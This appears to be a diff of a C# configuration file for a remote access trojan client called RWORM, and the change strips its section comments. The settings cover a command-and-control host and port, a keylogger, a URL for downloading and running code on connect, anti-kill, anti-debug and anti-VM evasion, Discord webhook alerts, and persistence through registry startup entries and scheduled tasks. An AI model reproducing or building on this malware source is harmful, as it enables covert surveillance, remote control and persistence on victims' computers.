@@ -5,7 +5,7 @@ namespace RWORM.Client.Core
 {
     public class Config
     {
-        // ── C2 ───────────────────────────────────────────────────────────────
+        
         public static string C2Host = "127.0.0.1";
         public static int    C2Port = 3333;
         public static string EncryptionKey = "AES-256-DEFAULT";
@@ -14,29 +14,29 @@ namespace RWORM.Client.Core
         public static int    HeartbeatInterval = 30000;
         public static string PastebinRaw     = "";
 
-        // ── Keylogger ─────────────────────────────────────────────────────────
+        
         public static bool   KeyloggerEnabled = false;
-        public static bool   KeyloggerOnline  = false;   // false = offline mode
+        public static bool   KeyloggerOnline  = false;   
 
-        // ── Task on connect ───────────────────────────────────────────────────
+        
         public static bool   TaskEnabled   = false;
-        public static string TaskLoaderUrl = "";          // URL to download+exec on connect
+        public static string TaskLoaderUrl = "";          
 
-        // ── Anti-Kill & Evasion ───────────────────────────────────────────────
+        
         public static bool AntiKill  = true;
         public static bool AntiDebug = false;
         public static bool AntiVM    = false;
 
-        // ── Discord Webhook Alerts ────────────────────────────────────────────
+        
         public static bool   DiscordAlert   = false;
         public static string DiscordWebhook = "";
 
-        // ── Persistence ───────────────────────────────────────────────────────
+        
         public static bool   StartupRegistry = false;
         public static bool   SchTasks        = false;
         public static string StartupPath     = @"%APPDATA%\RWORM";
 
-        // ─────────────────────────────────────────────────────────────────────
+        
 
         public static string GetGuid()
         {
